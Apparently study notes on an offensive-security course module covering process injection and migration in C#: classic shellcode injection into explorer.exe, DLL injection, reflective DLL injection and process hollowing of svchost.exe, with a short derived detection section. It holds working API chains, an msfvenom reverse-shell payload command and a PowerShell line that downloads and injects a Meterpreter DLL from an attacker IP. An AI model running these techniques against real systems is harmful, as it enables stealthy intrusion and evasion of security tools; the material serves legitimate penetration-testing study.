PEN-300 Module 9 — Process Injection and Migration (C# injection, DLL injection, reflective loading, hollowing)

Fuente: material del curso correspondiente (sin video público)

Objective

Move a shell out of the process it was born in. A shellcode runner (Word macro, PowerShell, Jscript) executes inside its own host process, which creates two problems the module attacks head-on:

  1. Fragility — the victim closes the application and the shell dies with it.
  2. Detection — security software flags network communication from a process that never normally generates it.

The fix is injection/migration into a process that is (a) long-lived and (b) expected to talk on the network. The module builds four techniques in C#, each trading implementation complexity for stealth:

  1. Classic shellcode injection — OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread into explorer.exe.
  2. DLL injection — force a remote process to call LoadLibraryA on an on-disk unmanaged DLL.
  3. Reflective DLL injection — same result, but the DLL never touches disk and never appears in Process Explorer's module list.
  4. Process hollowing — create a suspended svchost.exe, overwrite its entry point with shellcode, resume it.

Target surface

  • Lab layout: Kali attacker at 192.168.119.120 (Meterpreter HTTPS handler on 443); Windows victim VMs at 192.168.120.11 and 192.168.120.12; C# projects built on a Windows 11 development machine. Payloads are 64-bit staged Meterpreter (windows/x64/meterpreter/reverse_https) generated with msfvenom.
  • Injection targets ranked by the course: explorer.exe (always present, exits only at logoff, same integrity level as a normal user), a hidden notepad.exe, and svchost.exe (the end goal — network activity from it is normal, but it runs at SYSTEM integrity).
  • Key constraint: integrity levels. A process can only be opened/injected into at the same or lower integrity level than the caller (Security Descriptor + integrity level checks on OpenProcess). A Word-macro or Jscript context (Medium integrity) cannot open a High-integrity process — this is why explorer.exe is the workhorse target and why svchost requires hollowing rather than plain injection.
  • Extraction note: the source contains no credentials; all commands run as the lab's standard non-admin user.

Techniques

1. Classic process injection in C

The four-API chain, each imported via P/Invoke (DllImport statements copied from pinvoke.net):

IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);          // PROCESS_ALL_ACCESS, explorer PID
IntPtr addr     = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                 // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE; lpAddress = NULL on purpose —
                 // a fixed address fails if already allocated
WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize); // staged meterpreter csharp shellcode
IntPtr hThread  = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

Implementation notes the course calls out:

  • dwDesiredAccess = 0x001F0FFF (PROCESS_ALL_ACCESS) is checked against the target's Security Descriptor; integrity level is the effective gate. (The example explorer PID 4804 changes per login/machine.)
  • VirtualAllocEx is the remote-capable sibling of the VirtualAlloc used in earlier shellcode runners; likewise WriteProcessMemory replaces RtlMoveMemory/Copy and CreateRemoteThread replaces CreateThread — none of the local-only APIs work cross-process.
  • The C# out keyword on lpNumberOfBytesWritten exists purely to match the prototype's pointer semantics.
  • lpStartAddress is the address of the remote buffer; lpParameter is NULL because raw shellcode takes no arguments.

Result: a Meterpreter session whose getpid matches the explorer PID (4804 in the lab run) — the shell survives even if the original delivery process dies.

Architecture pitfall: of the four migration paths (64→64, 64→32, 32→32, 32→64), only 32→64 fails — CreateRemoteThread does not support it. Advanced implants (Meterpreter included) work around it by performing the 32-to-64-bit long-mode transition in custom assembly; out of scope here. Compile as x64 when targeting 64-bit processes.

Extra mile (exercises): resolve the PID dynamically with Process.GetProcessByName; replace VirtualAllocEx+WriteProcessMemory with the low-level ntdll quartet NtCreateSection / NtMapViewOfSection / NtUnMapViewOfSection / NtClose.

2. DLL injection

Instead of shellcode, make the remote process load an entire unmanaged DLL. Since LoadLibrary cannot be invoked remotely, the trick is to abuse CreateRemoteThread's parameters: the thread's start address can be any function address in the remote process — including LoadLibraryA itself — and the fifth parameter is that function's argument.

Recipe in C#:

  1. Generate the payload DLL: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o /var/www/html/met.dll.
  2. Download it to disk (WebClient.DownloadFile into the user's Documents folder) — LoadLibrary only accepts files present on disk.
  3. OpenProcess on explorer (PID resolved via Process.GetProcessesByName("explorer")), VirtualAllocEx an RW buffer, WriteProcessMemory the DLL path string into it.
  4. Resolve the function address locally: GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA") — valid remotely because native DLLs are mapped at the same base address across processes.
  5. CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero) — start address = LoadLibraryA, argument = the path buffer.

Why the payload must live in DllMain: GetProcAddress cannot resolve APIs in a remote process, so the DLL cannot export a function to call afterwards. Instead, place the shellcode under the DLL_PROCESS_ATTACH case of the DllMain switch — it executes automatically when LoadLibrary initializes the module. The DLL must be unmanaged (C/C++); a managed C# DLL cannot be loaded into an unmanaged process (msfvenom's -f dll handles generation).

Verification: Process Explorer → explorer.exe → View ▸ Lower Pane View ▸ DLLs shows met.dll loaded. Downside the module explicitly flags: the DLL is written to disk, leaving an artifact (and the exercise asks whether you can even delete it while the shell holds it open).

3. Reflective DLL injection

Removes the disk artifact. LoadLibrary does three things — map the PE into memory, set permissions, and register the module (making it visible to GetProcAddress and Process Explorer). Reflective injection keeps only the mapping: the loader parses the DLL's own PE headers and maps the contents into memory manually, so the module is never registered and never seen by enumeration tools.

Implementation is not written from scratch — the module reuses Invoke-ReflectivePEInjection (Joe Bialek / Matt Graeber, almost 3000 lines, two modes: load into the current process or a remote one). The DLL is supplied purely as a byte array in memory:

PS C:\Users\offsec> PowerShell -Exec Bypass
PS C:\Users\offsec> $bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll')
PS C:\Users\offsec> $procid = (Get-Process -Name explorer).Id
PS C:\Users\offsec> Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
PS C:\Users\offsec> Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid

Gotchas documented in the source:

  • A VoidFunc couldn't be found in the DLL error is thrown but does not affect functionality — ignore it.
  • The public version of the script fails on Windows 10 1803+ (multiple GetProcAddress definitions in UnsafeNativeMethods); the lab's copy in C:\Tools is patched.
  • Post-injection, met.dll does not appear in Process Explorer's DLL listing — the stealth payoff of skipping registration.

4. Process hollowing

The goal is to live in svchost.exe — a trusted process that legitimately generates network traffic — but two obstacles block plain injection: all svchost processes run at SYSTEM integrity (unreachable from Medium), and a launched svchost terminates immediately if you tamper with it after start. Hollowing sidesteps both by modifying the process before its first instruction executes.

Mechanics: create the process suspended with CreateProcessW (dwCreationFlags = 0x4, CREATE_SUSPENDED; high-level Process.Start cannot do this). Windows has already built the virtual memory space, allocated the stack with TEB/PEB, and loaded the EXE and its DLLs — but the main thread is halted just before running the EXE entry point. Overwrite the entry point with shellcode, then ResumeThread(pi.hThread).

Locating the entry point (ASLR defeats hardcoding), step by step:

  1. ZwQueryInformationProcess with ProcessInformationClass = 0 (ProcessBasicInformation) fills a PROCESS_BASIC_INFORMATION whose PebAddress field gives the remote PEB. (Zw/Nt prefixes denote user-mode vs kernel-mode callers; either works in user space. The API returns an NTSTATUS straight from the kernel.)
  2. The image base pointer sits at PebAddress + 0x10. Since the PEB lives in the remote process, read it with ReadProcessMemory (8 bytes — IntPtr.Size; adapt to 4 bytes for 32-bit targets) and convert with BitConverter.ToInt64.
  3. Read the first 0x200 bytes at the image base: the PE header. Parse:
  4. e_lfanew at offset 0x3C → offset from image base to the PE header.
  5. The entry-point RVA at e_lfanew + 0x28.
  6. addressOfEntryPoint = entrypoint_rva + svchost_base.

Then WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead) overwrites the original code and ResumeThread starts it. The worked example in the text traces the pointer arithmetic with fictitious addresses (PEB 0x3004000, base 0x7ffff01000000, e_lfanew = 0x110 → the entry-point VA is computed as base + RVA read from e_lfanew + 0x28) — worth tracing once to internalize the offsets.

Supporting C# plumbing: CreateProcessW DllImport plus STARTUPINFO and PROCESS_INFORMATION structs (pinvoke.net), ZwQueryInformationProcess from ntdll.dll. Compile as x64 Release.

Result: a Meterpreter session inside svchost.exe, where its HTTPS beaconing looks unremarkable. The same technique can hollow an entire compiled EXE rather than just shellcode. Exercise: identify the parent process of the hollowed svchost.

Detection & defense

The module is purely offensive and does not teach detection, but each technique leaves a distinct footprint — derived notes below, not course text:

  • Classic injection is the noisiest: OpenProcess(PROCESS_ALL_ACCESS) on explorer from an Office/scripting host, followed by RWX allocation (PAGE_EXECUTE_READWRITE) and CreateRemoteThread, is the canonical EDR detection chain. Defenders key on suspicious handle acquisition, RWX private memory in a host process, and remote-thread creation — the exact API sequence this module teaches.
  • DLL injection leaves met.dll visible in module listings (the course itself verifies it with Process Explorer) and an on-disk DLL in a user-writable folder — enumerate unsigned modules in user directories.
  • Reflective injection defeats module enumeration, so detection shifts to memory characteristics: unbacked executable regions (no file on disk backing the mapped PE), and the PowerShell download-cradle that fetched the bytes.
  • Hollowing trades accessibility for camouflage: the beacon comes from svchost, where HTTPS is expected. Defensive tells are a svchost.exe launched by a user process (parentage anomaly — the exercise even asks for the hollowed process's parent), a suspended-process creation followed by cross-process writes, and entry-point memory that differs from the on-disk image.
  • Cross-cutting: integrity levels are the only barrier used here — all four techniques assume Medium-integrity execution and pick targets accordingly. Processes holding secrets or elevated tokens stay out of reach until privilege escalation, which is why hardening integrity boundaries still matters.
